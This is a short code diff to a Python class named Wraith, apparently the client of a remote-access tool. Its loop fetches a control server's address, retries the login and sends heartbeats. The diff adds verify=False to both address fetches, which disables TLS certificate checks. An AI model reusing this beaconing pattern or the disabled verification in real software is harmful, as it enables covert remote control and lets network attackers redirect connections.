@@ -255,7 +255,7 @@ class Wraith():
 
 while True:
     # Get the address of the wraith API
-    try: connect_url = requests.get(FETCH_SERVER_LOCATION_URL).text; break
+    try: connect_url = requests.get(FETCH_SERVER_LOCATION_URL, verify=False).text; break
     except:
         if DEBUG_MODE: print("Failed to get the address of the API")
         time.sleep(5)
@@ -275,7 +275,7 @@ while True:
         while not wraith.login():
             if DEBUG_MODE: print("Failed to log in, waiting 10 seconds before re-try")
             time.sleep(10)
-            try: wraith.api_url = requests.get(FETCH_SERVER_LOCATION_URL).text
+            try: wraith.api_url = requests.get(FETCH_SERVER_LOCATION_URL, verify=False).text
             except:
                 if DEBUG_MODE: print("Failed to get address of the API")
         # Continue to the next loop (re-send heartbeat)
